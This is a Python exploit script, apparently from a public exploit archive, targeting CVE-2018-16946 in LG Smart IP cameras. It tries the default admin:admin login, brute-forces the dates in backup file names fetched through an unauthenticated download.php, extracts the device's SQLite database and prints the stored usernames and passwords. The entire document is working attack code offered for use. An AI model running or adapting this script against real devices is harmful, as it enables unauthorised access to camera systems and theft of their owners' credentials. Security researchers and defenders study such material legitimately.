#!/usr/bin/python3

import os
import sys
import sqlite3
import tarfile
import requests    
import datetime
import threading

if len(sys.argv) < 2:
    print("Usage:\n\t"+sys.argv[0]+" <TARGET-URL>")
    exit(0)

print("#==========================================================================#")
print("# Exploit Title: LG Smart IP Device Backup Download")
print("# Date: 09-11-2018")
print("# Exploit Author: Ege Balcı")
print("# Vendor Homepage: https://www.lg.com")
print("# Model: LNB*/LND*/LNU*/LNV*")
print("# CVE: CVE-2018-16946")
print("#==========================================================================#\n\n")

model_version_list = ["2219.0.0.1505220","2745.0.0.1508190","1954.0.0.1410150", "1030.0.0.1310250"] 

# First try the default login creds...
headers = {'Authorization': 'Basic YWRtaW46YWRtaW4='}
default = requests.get(sys.argv[1]+"/httpapi?GetDeviceInformation", headers=headers)
if "Model:" in default.text:
    print("[+] Default password works :) (admin:admin)")
    # exit(0)


def brute(model_version):
    date = datetime.datetime.now()
    u = (['\\','|','/','-'])

    for i in range(0,3650): # No need to go back futher these cameras didn't existed 10 years ago :)
        sys.stdout.flush()
        sys.stdout.write("\r[*] Bruteforing backup date...{0}".format(u[i%4]))

        log_date = date.strftime("%y")
        log_date += date.strftime("%m")
        log_date += date.strftime("%d")        

        url = "/download.php?file="
        backup_name = "backup_"
        backup_name += log_date
        backup_name += "_"+model_version+".config"

        
        ContentLength = requests.head(sys.argv[1]+url+backup_name,stream=True).headers["Content-Length"]
        if ContentLength != "":
            backup = requests.get(sys.argv[1]+url+backup_name)
            print("\n[+] Backup file found !")
            print("[+] "+backup_name+" -> "+str(len(backup.content))+"\n")
            backup_file = open(backup_name+".tar.gz","wb")
            backup_file.write(backup.content)
            backup_file.close()
            tar = tarfile.open(str(backup_name+".tar.gz"),mode="r:gz")
            for member in tar.getnames():
                # Print contents of every file
                print("[>] "+member)
                mem = open(member,"wb")
                mem.write(tar.extractfile(member).read())
            
            
            conn = sqlite3.connect('mipsca.db')
            c = conn.cursor()
            users = c.execute("SELECT * FROM User")
            print("#=============== SUCCESS ===============#")
            for u in users:
                print("\n[#] Username: "+u[0])
                print("[#] Password: "+u[1])
            os.system("rm mipsca.db ConfigInfo.txt "+ backup_name+".tar.gz")
            break
        date = (date-datetime.timedelta(days=1))



report = requests.get(sys.argv[1]+"/updownload/t.report",verify=False)
if report.status_code != 200:
    print("[-] Target device don't have report data :(")
    jobs = []
    for mv in model_version_list:
        t = threading.Thread(target=brute(mv))
        jobs.append(t)

    for j in jobs:
        j.start()
else:
    model_id = (((report.text.split("= "))[1]).split("\n"))[0]
    print("[+] Model ID: "+model_id)
    version = (((report.text.split("= "))[2]).split("\n"))[0]
    print("[+] Version: "+version)
    brute(model_id+"."+version)
